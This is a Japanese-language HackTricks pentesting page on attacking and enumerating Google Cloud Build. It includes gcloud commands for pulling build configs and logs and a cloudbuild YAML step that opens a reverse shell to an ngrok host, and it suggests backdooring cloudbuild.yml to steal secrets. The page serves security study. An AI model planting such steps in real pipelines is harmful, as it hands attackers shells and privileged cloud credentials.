# GCP - Cloud Build Enum

<details>

<summary><strong>ハックトリックをサポートして特典を得る！</strong></summary>

* **HackTricksで会社の広告を見たい**場合や、**最新バージョンのPEASSやHackTricksをPDFでダウンロード**したい場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter**で私をフォローする 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)
* **ハッキングのトリックを共有するために、PRを** [**HackTricks**](https://github.com/carlospolop/hacktricks) **と** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **のGitHubリポジトリに提出してください。**

</details>

## 基本情報

Google Cloud Buildは、**ソフトウェアのビルド**とリリースプロセスを自動化する**管理型CI/CDプラットフォーム**であり、**ソースコードリポジトリ**と統合し、さまざまなプログラミング言語をサポートしています。開発者は、コードを**自動的にビルド、テスト、デプロイ**することができます。また、ビルドステップとワークフローをカスタマイズする柔軟性も提供しています。

各Cloud Buildトリガーは、**Cloudリポジトリに関連付けられているか、外部リポジトリ**（Github、Bitbucket、Gitlab）と直接接続されています。

Cloud Buildを**ビルドの実行に承認を必要とするように設定**することも可能です（デフォルトでは無効）。

**サービスアカウントには`cloud-platform`スコープがあり**、すべての特権を使用することができます。**SAが指定されていない場合**（submit時など）、**デフォルトのSA** `<proj-number>@cloudbuild.gserviceaccount.com`が**使用されます。**

{% hint style="success" %}
ここからまたはCloudリポジトリからGithub/Bitbucketトークンを盗む方法は見つかりませんでした。リポジトリがダウンロードされると、[https://source.cloud.google.com/](https://source.cloud.google.com/)のURLを介してアクセスされ、クライアントからはGithubにアクセスされません。
{% endhint %}

### ストレージ

Cloud Buildは、**トリガーのファイルを保存するために新しいストレージを生成することがあります**。これは、GCPが提供する例で発生します。
```bash
git clone https://github.com/GoogleCloudBuild/cloud-console-sample-build && \
cd cloud-console-sample-build && \
gcloud builds submit --config cloudbuild.yaml --region=global
```
### シェルを取得する
```yaml
steps:
- name: bash
script: |
#!/usr/bin/env bash
bash -i >& /dev/tcp/5.tcp.eu.ngrok.io/12395 0>&1
options:
logging: CLOUD_LOGGING_ONLY
```
### 列挙

ビルドの設定とログには、**機密情報が含まれている可能性があります**。
```bash
gcloud builds list
gcloud builds describe <build-uuid> # Get even the build yaml if defined in there
gcloud builds log <build-uuid> # Get build logs
```
## 特権昇格

{% content-ref url="../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md" %}
[gcp-cloudbuild-privesc.md](../../gcp-security/gcp-privilege-escalation/gcp-cloudbuild-privesc.md)
{% endcontent-ref %}

### 認証されていないアクセス

### cloudbuild.yml

リポジトリに書き込みアクセスを侵害すると、**`cloudbuild.yml`**という名前のファイルが含まれている場合、このファイルを**バックドア**にすることができます。このファイルは、Cloud Build内で実行される**コマンドを指定**しており、秘密情報を外部に持ち出し、実行内容を妨害し、または**Cloud Buildサービスアカウントを危険にさらす**ことができます。

{% hint style="info" %}
GCPには、管理者が外部のPRからのビルドシステムの実行を制御するオプションがあります。コメント制御とは、共同作業者/プロジェクト所有者が「/gcbrun」とコメントすることで、PRに対してビルドをトリガーする必要がある機能です。この機能を使用すると、インターネット上の誰もがビルドシステムをトリガーすることができなくなります。
{% endhint %}

関連情報については、次のページを参照してください。Github Actionsを攻撃する方法についてのページです（これに類似しています）：

{% content-ref url="../../../pentesting-ci-cd/github-security/abusing-github-actions/" %}
[abusing-github-actions](../../../pentesting-ci-cd/github-security/abusing-github-actions/)
{% endcontent-ref %}

<details>

<summary><strong>Support HackTricks and get benefits!</strong></summary>

* もしもあなたの**会社をHackTricksで宣伝したい**場合や、**PEASSの最新バージョンにアクセスしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を手に入れましょう。
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけて、独占的な[**NFT**](https://opensea.io/collection/the-peass-family)を手に入れましょう。
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォロー**してください。
* **HackTricks**と**HackTricks Cloud**のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有しましょう。

</details>
